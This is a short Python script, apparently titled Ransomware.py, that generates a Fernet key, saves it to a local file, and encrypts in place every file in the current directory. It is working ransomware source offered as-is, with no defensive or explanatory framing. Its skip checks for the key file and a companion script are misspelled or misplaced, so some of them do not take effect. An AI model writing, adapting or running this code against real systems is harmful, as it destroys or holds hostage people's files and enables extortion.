
import os
from cryptography.fernet import Fernet


files=[] #empty list

for current_file in os.listdir(): #will go through current files
    if current_file == "Ransomware.py":
        continue
    if os.path.isfile(current_file): #if it is indeed a file and not a directory
        files.append(current_file)
    if current_file == "theykey.key":
        continue
    if current_file=="rootp.py":
        continue

print(files)

key=Fernet.generate_key()

with open("thekey.key","wb") as our_key:
    our_key.write(key)
print(key)

for some_file in files:
    with open(some_file, "rb") as file:
        contents=file.read()
    content_encrypted=Fernet(key).encrypt(contents)
    with open(some_file,"wb") as file:
        file.write(content_encrypted)
        